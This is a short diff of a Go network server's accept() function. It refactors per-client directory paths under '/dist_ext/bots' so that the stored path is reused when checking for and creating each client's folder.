@@ -83,12 +83,15 @@ func accept(conn net.Conn) {
 		log.Println("Invalid Hostname:", err)
 		return
 	}
-	c.Client = Client{Hostname: c.Hostname, Path: filepath.Join("bots", c.Hostname)}
+	c.Client = Client{
+		Hostname: c.Hostname,
+		Path:     filepath.Join("/dist_ext/bots", c.Hostname),
+	}
 
 	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})
 
-	if _, err := os.Stat("/dist_ext/bots/" + c.Hostname); err != nil {
-		os.MkdirAll("/dist_ext/bots/"+c.Hostname, os.ModePerm)
+	if _, err := os.Stat(c.Client.Path); err != nil {
+		os.MkdirAll(c.Client.Path, os.ModePerm)
 	}
 	if c.Client.Name == "" {
 		c.Client.Name = c.Client.Hostname
